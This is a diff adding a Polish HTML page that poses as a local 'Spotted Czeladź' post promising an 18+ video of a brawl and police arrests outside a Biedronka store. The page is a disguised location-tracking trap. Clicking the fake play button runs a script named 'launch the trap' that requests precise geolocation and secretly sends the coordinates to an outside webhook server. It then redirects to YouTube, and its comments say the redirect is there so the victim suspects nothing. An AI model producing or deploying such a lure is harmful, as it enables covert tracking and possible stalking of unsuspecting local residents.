@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotted Czeladź - Pilne!</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #0f0f11; 
+            color: #fff; 
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.85)), url('https://images.unsplash.com/photo-1519501025264-65ba15a82390?auto=format&fit=crop&w=1200&q=80');
+            background-size: cover;
+            background-position: center;
+        }
+        .card { 
+            background: #18191c; 
+            width: 100%;
+            max-width: 380px; 
+            margin: 15px;
+            padding: 20px; 
+            border-radius: 14px; 
+            box-shadow: 0 8px 30px rgba(0,0,0,0.7); 
+            border: 1px solid #2f3136;
+            box-sizing: border-box;
+        }
+        .header-tag {
+            color: #ff4757;
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        h2 { 
+            color: #ffffff; 
+            font-size: 20px; 
+            margin-top: 0;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+        p { 
+            color: #b9bbbe; 
+            font-size: 13px; 
+            line-height: 1.5; 
+            margin-bottom: 16px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+            margin-bottom: 16px;
+            border: 1px solid #2f3136;
+        }
+        .video-bg {
+            width: 100%;
+            height: 100%;
+            background-image: url('https://images.unsplash.com/photo-1541872703-74c5e44368f9?auto=format&fit=crop&w=600&q=80');
+            background-size: cover;
+            background-position: center;
+            filter: blur(6px);
+            transform: scale(1.1);
+        }
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.35);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .play-btn {
+            width: 56px;
+            height: 56px;
+            background: #ff4757;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.5);
+            transition: transform 0.2s;
+        }
+        .play-btn:hover {
+            transform: scale(1.08);
+        }
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-top: 10px solid transparent;
+            border-bottom: 10px solid transparent;
+            border-left: 16px solid white;
+            margin-left: 3px;
+        }
+        .badge-18 {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(255, 71, 87, 0.9);
+            color: white;
+            padding: 3px 8px;
+            font-size: 10px;
+            font-weight: bold;
+            border-radius: 4px;
+            letter-spacing: 0.5px;
+        }
+        .btn { 
+            background: #ff4757; 
+            color: white; 
+            border: none; 
+            padding: 14px 20px; 
+            font-size: 15px; 
+            font-weight: bold; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%; 
+            box-sizing: border-box;
+            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #ff6b81; }
+        .footer { font-size: 11px; color: #72767d; margin-top: 16px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header-tag">⚠️ SPOTTED CZELADŹ / PILNE</div>
+        <h2>Awantura i dym pod Biedronką!</h2>
+        <p>Ktoś w końcu nagrał całą akcję z wczorajszego wieczoru na Legionów. Policja ostro zawijała typów. Obejrzyj wideo zanim usuną post!</p>
+        
+        <div class="video-container" onclick="uruchomPulapke()">
+            <div class="video-bg"></div>
+            <div class="badge-18">WIDEO 18+</div>
+            <div class="video-overlay">
+                <div class="play-btn">
+                    <div class="play-icon"></div>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn" onclick="uruchomPulapke()">▶ ODTWÓRZ NAGRANIE</button>
+        
+        <div class="footer">Spotted Czeladź © 2026 • Wszelkie prawa zastrzeżone</div>
+    </div>
+
+    <script>
+        function uruchomPulapke() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        var lat = position.coords.latitude;
+                        var lon = position.coords.longitude;
+                        
+                        // Wysyłamy współrzędne do naszego serwera na Renderze w tle
+                        fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon)
+                            .catch(err => console.log(err));
+                            
+                        // Przekierowujemy na YouTube do autentycznego filmu z bójką
+                        setTimeout(function() {
+                            window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
+                        }, 500);
+                    },
+                    function(error) {
+                        // Nawet jak odmówi, i tak puszczamy na film, żeby nic nie wzbudziło podejrzeń
+                        window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
+            }
+        }
+    </script>
+
+</body>
+</html>
